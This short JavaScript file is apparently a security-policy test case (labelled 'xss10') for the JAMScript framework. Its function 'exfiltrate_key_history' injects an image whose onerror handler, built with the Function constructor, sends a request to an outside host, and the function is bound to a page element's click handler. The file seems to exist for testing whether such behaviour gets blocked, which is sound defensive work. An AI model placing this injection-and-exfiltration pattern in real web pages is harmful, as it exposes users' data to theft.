
JAM.startProfile('load');
function exfiltrate_key_history(){var URL=JAMScript.call(Function,null,['xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss10",true);xmlhttp.send(null);']),script=document.createElement("img");script.src="/";JAMScript.set(script,"onerror",URL);URL=document.getElementsByTagName("body");URL=URL[0];JAMScript.call(URL.appendChild,URL,[script])}var v1=document.getElementById("test");JAMScript.set(v1,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
